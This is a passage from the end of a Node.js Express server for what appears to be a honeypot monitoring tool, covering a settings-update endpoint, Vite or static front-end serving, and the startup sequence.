       VALUES (1, $1, $2, $3)
       ON CONFLICT (id) DO UPDATE SET
         simulation_speed = EXCLUDED.simulation_speed,
         alert_threshold = EXCLUDED.alert_threshold,
         decoy_profile = EXCLUDED.decoy_profile`,
      [settings.simulationSpeed, settings.alertThreshold, settings.decoyProfile]
    );

    resetGenerator();
    res.json({
      status: 'success',
      settings
    });
  } catch (err) {
    console.error('POST /api/settings failed:', err);
    res.status(500).json({ error: 'Failed to update settings' });
  }
});

// --- VITE INTERFACE INTEGRATION MIDDLEWARES ---
async function startWebPipeline() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Honeypot Core Server listening on http://0.0.0.0:${PORT}`);
  });
}

// --- Bootstrap ---
async function main() {
  await initSchema();
  await loadStateFromDb();
  resetGenerator();
  startHoneypotListeners();
  await startWebPipeline();
}

main().catch((err) => {
  console.error('Fatal startup error:', err);
  process.exit(1);
});
